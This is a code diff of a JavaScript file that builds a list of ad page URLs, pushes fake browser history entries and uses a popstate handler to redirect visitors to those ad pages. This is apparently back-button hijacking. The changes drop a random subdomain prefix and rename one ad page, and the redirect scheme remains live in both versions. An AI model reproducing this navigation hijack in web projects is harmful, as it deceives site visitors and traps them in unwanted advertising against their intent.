@@ -1,5 +1,8 @@
 var globalLink = new Array();
-var apidomain = '//' + Math.random().toString(36).substr(2) + '.' + location.hostname + '/';
+//var apidomain =  location.hostname;
+//var hostname  = apidomain.split('.');
+//var apidomain = '//' + Math.random().toString(36).substr(2) + '.' + location.hostname + '/';
+var apidomain = '//' + location.hostname + '/';
 // 广告
 globalLink.push(apidomain + 'qysq.html');//0
 globalLink.push(apidomain + 'tsyj.html');//1
@@ -10,7 +13,7 @@ globalLink.push(apidomain + 'nkgg.html');//5
 //globalLink.push(apidomain + 'mldq.html');
 //globalLink.push(apidomain + 'yx.html');
 globalLink.push(apidomain + 'ydjz.html');//6
-globalLink.push(apidomain + 'lzy.html');//7
+globalLink.push(apidomain + 'lz515y000.html');//7
 //顺序 56740123
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
@@ -32,7 +35,7 @@ $(window).on('popstate', function(e){
     if (path.substr(1) == 'ydjz') {
         number = 7;
     }
-    if (path.substr(1) == 'lzy') {
+    if (path.substr(1) == 'lz515y000') {
         number = 4;
     }
     if (path.substr(1) == 'zrl') {
